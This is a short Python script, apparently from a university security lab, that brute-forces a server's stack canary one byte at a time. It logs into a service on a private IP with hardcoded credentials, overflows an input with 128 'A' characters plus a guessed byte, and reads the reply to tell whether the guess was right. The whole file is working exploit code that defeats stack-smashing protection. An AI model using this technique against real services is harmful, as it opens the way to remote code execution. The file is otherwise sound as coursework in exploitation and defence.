#!/usr/bin/python
import socket
import time

def checkResponse(res):
    time.sleep(0.5)
    badRes = 'RED'
    if badRes in res:
        return 0
    else:
        return 1

def main():

    canary1 = 'a'

    for element in range(256):

        IP_FH = '10.105.21.174'
        IP_MARTIN = '10.0.2.22'
        IP = IP_FH
        PORT = 8080
        BUFFE_SIZE = 4096

        login = 'cs19m050:cs19m050' + '\n'
        buffer = 'u ' + 'A'*128 + chr(element) + '\n'
        exit = 'e' + '\n'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        connect = s.connect((IP, PORT))  # hardcoded IP address
        time.sleep(0.5)
        res1 = s.recv(BUFFE_SIZE)
        print(res1)

        #login with username
        s.send(login)
        res3 = s.recv(BUFFE_SIZE)
        print (res3)

        s.send(buffer)
        res4_1 = s.recv(BUFFE_SIZE)
        print('res4_1', res4_1)
        s.send(exit)
        res5 = s.recv(BUFFE_SIZE)
        res6 = s.recv(BUFFE_SIZE)
        print(res5)
        print(res6)
        print('res5', res5)
        print('res6', res6)
        result = checkResponse(res5+res6)

        if result == 1:
            canary1 = element
            print('Canary1 = ' + str(canary1) + hex(canary1))
            break
        else:
            print('Canary1 is not ' + str(element) + ' - ' + hex(element))

        s.close()

main()